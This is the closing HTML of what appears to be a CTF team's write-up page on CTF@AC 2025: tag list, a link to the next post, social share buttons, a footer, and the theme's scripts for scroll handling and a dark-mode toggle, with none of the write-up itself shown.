      <li><a href="https://pascalctf.github.io/en/tags/ctfatac2025/">Ctfatac2025</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="https://pascalctf.github.io/en/ctf/scriptctf2025/">
    <span class="title">Next ¬ª</span>
    <br>
    <span>scriptCTF 2025</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 on x"
            href="https://x.com/intent/tweet/?text=CTF%40AC%202025&amp;url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f&amp;hashtags=ctfatac%2cctf%2cbinary%2ccrypto%2cweb%2cctfatac2025">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f&amp;title=CTF%40AC%202025&amp;summary=CTF%40AC%202025&amp;source=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f&title=CTF%40AC%202025">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 on whatsapp"
            href="https://api.whatsapp.com/send?text=CTF%40AC%202025%20-%20https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 on telegram"
            href="https://telegram.me/share/url?text=CTF%40AC%202025&amp;url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=CTF%40AC%202025&u=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://pascalctf.github.io/en/">Website</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
